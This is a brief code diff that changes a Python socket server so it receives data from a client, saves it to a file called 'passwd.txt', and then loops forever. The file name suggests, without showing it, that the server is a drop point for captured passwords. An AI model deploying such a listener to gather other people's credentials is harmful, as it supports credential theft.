@@ -7,4 +7,8 @@ s.bind((HOST,PORT))
 s.listen(5)
 while True:
     client,addr=s.accept()
-    print("123")
+    data=client.recv(1024).decode()
+    with open("passwd.txt",'w') as f:
+        f.write(data)
+    while True:
+        pass
